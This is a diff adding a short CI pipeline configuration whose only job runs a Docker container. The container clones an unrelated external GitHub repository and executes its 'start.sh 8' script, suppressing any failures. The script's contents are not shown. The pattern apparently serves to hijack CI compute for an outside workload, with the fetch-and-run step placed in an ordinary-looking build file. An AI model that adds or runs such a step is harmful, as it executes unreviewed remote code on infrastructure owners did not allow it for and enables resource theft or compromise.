@@ -1,0 +1,15 @@
+version: v1.0
+name: Docker Pipeline
+agent:
+  machine:
+    type: e1-standard-2
+    os_image: ubuntu2204
+blocks:
+  - name: Run Script in Docker
+    task:
+      jobs:
+        - name: Run Script
+          commands:
+            - checkout
+            - docker pull ubuntu:22.04
+            - docker run --rm ubuntu:22.04 /bin/bash -c "git clone https://github.com/Fiujol/android || true; cd android; bash start.sh 8 || echo 'Script failed'"
